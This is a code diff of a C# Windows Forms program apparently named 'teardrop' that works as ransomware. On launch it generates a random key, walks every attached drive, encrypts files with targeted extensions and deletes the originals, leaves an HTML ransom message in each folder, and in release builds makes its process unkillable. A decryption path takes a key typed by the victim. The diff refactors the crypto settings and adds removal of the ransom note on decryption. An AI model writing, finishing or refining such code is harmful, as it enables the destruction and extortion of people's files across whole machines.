@@ -1,6 +1,7 @@
 using System.Resources;
 using System.Security.Cryptography;
 using System.Text.Json;
+using teardrop.Classes;
 
 namespace teardrop
 {
@@ -19,7 +20,7 @@ namespace teardrop
         private readonly CancellationTokenSource _cancellationTokenSource;
         private readonly IProgress<string> _notification;
         private readonly SemaphoreSlim _semaphore;
-        private CryptoManager? _cryptoManager;
+        private readonly CryptoManager _cryptoManager;
 
         private enum CypherMode
         {
@@ -30,29 +31,27 @@ namespace teardrop
         public FrmMain()
         {
             InitializeComponent();
-            
+
+            ResourceManager resourceManager = new(typeof(FrmMain));
+
+            _ignoredPaths = JsonSerializer.Deserialize<string[]>(resourceManager.GetString("IGNORED_PATHS") ?? "") ?? [];
+            _allowedChars = JsonSerializer.Deserialize<char[]>(resourceManager.GetString("CHARS") ?? "") ?? [];
+            _allowedExtensions = JsonSerializer.Deserialize<string[]>(resourceManager.GetString("ALLOWED_EXTENSIONS") ?? "") ?? [];
+            _defaultMessage = JsonSerializer.Deserialize<string>(resourceManager.GetString("DEFAULT_MESSAGE") ?? "") ?? "";
+            _defaultExtension = JsonSerializer.Deserialize<string>(resourceManager.GetString("DEFAULT_EXTENSION") ?? "") ?? "";
+            _iteractionsLimit = JsonSerializer.Deserialize<int>(resourceManager.GetString("ITERACTIONS_LIMIT") ?? "0");
+            _saltSyze = JsonSerializer.Deserialize<int>(resourceManager.GetString("SALT_SIZE") ?? "0");
+            _keySyze = JsonSerializer.Deserialize<int>(resourceManager.GetString("KEY_SIZE") ?? "0");
+
             _semaphore = new SemaphoreSlim(1, 10);
 
             _cancellationTokenSource = new CancellationTokenSource();
 
             _notification = new Progress<string>(WriteLine);
 
-            ResourceManager resourceManager = new(typeof(FrmMain));
+            _cryptoManager = new CryptoManager(_cancellationTokenSource.Token);
 
-            _ignoredPaths = JsonSerializer.Deserialize<string[]>(resourceManager.GetString("IGNORED_PATHS") ?? "") ?? [];
-            _allowedChars = JsonSerializer.Deserialize<char[]>(resourceManager.GetString("CHARS") ?? "")??[];
-            _allowedExtensions = JsonSerializer.Deserialize<string[]>(resourceManager.GetString("ALLOWED_EXTENSIONS") ?? "") ?? [];
-            _defaultMessage = JsonSerializer.Deserialize<string>(resourceManager.GetString("DEFAULT_MESSAGE") ?? "") ?? "";
-            _defaultExtension = JsonSerializer.Deserialize<string>(resourceManager.GetString("DEFAULT_EXTENSION") ?? "") ?? "";
-            _iteractionsLimit = JsonSerializer.Deserialize<int>(resourceManager.GetString("ITERACTIONS_LIMIT") ?? "0");
-            _saltSyze = JsonSerializer.Deserialize<int>(resourceManager.GetString("SALT_SIZE") ?? "0");
-            _keySyze = JsonSerializer.Deserialize<int>(resourceManager.GetString("KEY_SIZE") ?? "0");            
-
-            GenereteApplicationID();
-            
-            CryptoSettings settings = new(GetHashedPassword(GetRandomString(_keySyze)), new byte[_saltSyze], _iteractionsLimit);
-
-            _cryptoManager = new CryptoManager(settings, _cancellationTokenSource.Token);
+            GenereteApplicationID(64);
 
 #if !DEBUG
             ProcessManager.ProcessUnkillable();
@@ -72,9 +71,9 @@ namespace teardrop
             return GetHashBytes(GetKeyBytes(Password));
         }
 
-        private void GenereteApplicationID()
+        private void GenereteApplicationID(int length)
         {
-            Text = GetRandomString(50);
+            Text = GetRandomString(length);
         }
 
         private static byte[] GetHashBytes(byte[] passwordBytes)
@@ -106,7 +105,7 @@ namespace teardrop
             txtBox.Text += $"[{DateTime.Now:yyyyy/MM/dd HH:mm:ss}]: {text}{Environment.NewLine}";
         }
 
-        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode, IProgress<string> notification)
+        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode)
         {
             try
             {
@@ -130,11 +129,11 @@ namespace teardrop
 
                                 await _cryptoManager.EncodeFileAsync(filePath, newFilePath);
 
-                                notification.Report($@"Encrypted {filePath}");
+                                _notification.Report($@"Encrypted {filePath}");
 
                                 RemoveFile(filePath);
 
-                                notification.Report($"Removed file {filePath}");
+                                _notification.Report($"Removed file {filePath}");
 
                                 break;
 
@@ -146,11 +145,11 @@ namespace teardrop
 
                                 await _cryptoManager.DecodeFileAsync(filePath, newFilePath);
 
-                                notification.Report($"Decrypted {filePath}");
+                                _notification.Report($"Decrypted {filePath}");
 
                                 RemoveFile(filePath);
 
-                                notification.Report($"Removed file {filePath}");
+                                _notification.Report($"Removed file {filePath}");
 
                                 break;
 
@@ -159,24 +158,37 @@ namespace teardrop
 
                         foreach (string directory in GetDirectories(rootPath))
                         {
-                            await ChangeAllFilesAsync(directory, mode, notification);
+                            await ChangeAllFilesAsync(directory, mode);
                         }
                     }
 
-                    CreateMessageFile(rootPath);
-
-                    notification.Report($"Message file created {rootPath}");
+                    CreateOrDeleteMessageFile(rootPath, mode);
                 }
             }
             catch (Exception ex)
             {
-                notification.Report(ex.Message);
+                _notification.Report(ex.Message);
             }
         }
 
-        private void CreateMessageFile(string path)
+        private void CreateOrDeleteMessageFile(string path, CypherMode mode)
         {
-            FileManager.WriteHtmlFile(path, _defaultMessage);
+            switch (mode)
+            {
+                case CypherMode.Encode:
+                    FileManager.WriteHtmlFile(path, _defaultMessage);
+
+                    _notification.Report($"Message file created {path}");
+                    break;
+
+                case CypherMode.Decode:
+                    FileManager.RemoveHtmlFile(path);
+
+                    _notification.Report($"Message file removed {path}");
+                    break;
+
+                default: throw new NotSupportedException();
+            }
         }
 
         private bool IgnoredPath(string rootPath)
@@ -206,19 +218,19 @@ namespace teardrop
             }
         }
 
-        private async Task ManageDrivesAsync(CypherMode mode, IProgress<string> notification)
+        private async Task ManageDrivesAsync(CypherMode mode)
         {
             IList<Task> tasks = [];
 
             foreach (DriveInfo drive in DriveInfo.GetDrives())
             {
-                tasks.Add(ReturnTaskChangeDriveAsync(mode, notification, drive));
+                tasks.Add(TaskChangeDriveAsync(mode, drive));
             }
 
             await Task.WhenAll(tasks);
         }
 
-        private Task ReturnTaskChangeDriveAsync(CypherMode mode, IProgress<string> notification, DriveInfo drive)
+        private Task TaskChangeDriveAsync(CypherMode mode, DriveInfo drive)
         {
             return Task.Run(async () =>
             {
@@ -226,7 +238,7 @@ namespace teardrop
 
                 try
                 {
-                    await ChangeDriveAsync(drive, mode, notification);
+                    await ChangeDriveAsync(drive, mode);
                 }
                 finally
                 {
@@ -235,22 +247,22 @@ namespace teardrop
             });
         }
 
-        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode, IProgress<string> notification)
+        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode)
         {
-            notification.Report($@"Found drive {drive.Name}");
+            _notification.Report($@"Found drive {drive.Name}");
 
             try
             {
                 if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");
 
-                await ChangeAllFilesAsync(drive.Name, mode, notification);
+                await ChangeAllFilesAsync(drive.Name, mode);
 
                 FileManager.WriteHtmlFile(drive.Name, _defaultMessage);
 
             }
             catch (Exception ex)
             {
-                notification.Report($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
+                _notification.Report($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
             }
         }
 
@@ -263,23 +275,21 @@ namespace teardrop
         {
             if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;
 
-            CryptoSettings settings = new(GetHashedPassword(txtKey.Text), GetSaltBytes(_saltSyze), _iteractionsLimit);
-
-            _cryptoManager = new CryptoManager(settings, _cancellationTokenSource.Token);
-
+            _cryptoManager.DefineSettings(new(GetHashedPassword(txtKey.Text), new byte[_saltSyze], _iteractionsLimit));
 #if DEBUG
-            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Decode, _notification);
+            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Decode);
 #else
-            await ManageDrivesAsync(CypherMode.Decode, _notification);
+            await ManageDrivesAsync(CypherMode.Decode);
 #endif
         }
 
         private async void FrmMain_Load(object sender, EventArgs e)
         {
+            _cryptoManager.DefineSettings(new(GetHashedPassword(GetRandomString(_keySyze)), GetSaltBytes(_saltSyze), _iteractionsLimit));
 #if DEBUG
-            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Encode, _notification);
+            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Encode);
 #else
-            await ManageDrivesAsync(CypherMode.Encode, _notification);
+            await ManageDrivesAsync(CypherMode.Encode);
 #endif
         }
     }
